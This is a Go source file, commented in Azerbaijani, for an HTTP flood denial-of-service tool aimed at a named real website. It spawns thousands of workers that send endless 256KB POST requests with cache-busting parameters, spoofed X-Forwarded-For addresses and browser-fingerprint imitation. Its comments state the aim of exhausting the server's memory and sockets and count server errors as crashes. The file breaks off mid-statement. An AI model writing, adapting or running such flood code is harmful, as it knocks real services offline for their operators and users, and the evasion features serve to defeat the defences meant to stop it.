package main

import (
	"crypto/tls"
	"fmt"
	"math/rand"
	"net"
	"net/http"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

func main() {
	// Hədəf saytın həm HTTPS, həm də ana URL-i
	target := "https://empro.az"
	// Railway resurslarını sona qədər istifadə etmək üçün
	workers := 3000 
	
	fmt.Printf("[!!!] HAKAI-DEMON-MODE AKTİVDİR: %s\n", target)

	// Xüsusi konfiqurasiya edilmiş Transport (Asılılıqları azaltmaq üçün)
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
			MinVersion:         tls.VersionTLS12,
			MaxVersion:         tls.VersionTLS13,
			NextProtos:         []string{"h2", "http/1.1"}, // HTTP/2 məcburi imitasiyası
		},
		DialContext: (&net.Dialer{
			Timeout:   10 * time.Second,
			KeepAlive: 30 * time.Second,
		}).DialContext,
		MaxIdleConns:          100000,
		MaxIdleConnsPerHost:   50000,
		IdleConnTimeout:       90 * time.Second,
		ExpectContinueTimeout: 1 * time.Second,
		DisableCompression:    false,
	}

	client := &http.Client{Transport: tr, Timeout: 7 * time.Second}
	var crashCount uint64
	var totalRequests uint64

	var wg sync.WaitGroup
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			// Serverin RAM-ını tam doldurmaq üçün çox ağır payload (256KB)
			payload := "x-beast=" + strings.Repeat("M", 262144) 
			
			for {
				// Cache bypass - Server hər bir sorğunu RAM-da emal etməlidir
				u := fmt.Sprintf("%s&bx=%d&ts=%d", target, rand.Intn(9999999), time.Now().UnixNano())
				
				req, _ := http.NewRequest("POST", u, strings.NewReader(payload))
				
				// Müasir Chrome 124 JA3 Fingerprint imitasiyası üçün Headers
				req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0.0.0 Safari/537.36")
				req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8")
				req.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
				req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
				req.Header.Set("X-Forwarded-For", fmt.Sprintf("%d.%d.%d.%d", rand.Intn(255), rand.Intn(255), rand.Intn(255), rand.Intn(255)))
				req.Header.Set("Connection", "keep-alive")

				resp, err := client.Do(req)
				atomic.AddUint64(&totalRequests, 1)

				if err == nil {
					// 5xx gəlirsə server rəsmi olaraq çökmüş sayılır
					if resp.StatusCode >= 500 {
						atomic.AddUint64(&crashCount, 1)
					}
					// Body-ni dərhal bağlamırıq, bir neçə millisaniyə açıq saxlayırıq ki socket dolub qalsın
					time.Sleep(20 * time.Millisecond)
					resp.Body.Close()
				} else {
					atomic.AddUint64(&crashCount, 1)
					// Əgər bağlantı dərhal qırılırsa 10ms gözlə və təkrar vur
					time.Sleep(10 * time.Millisecond)
				}
			}
		}(i
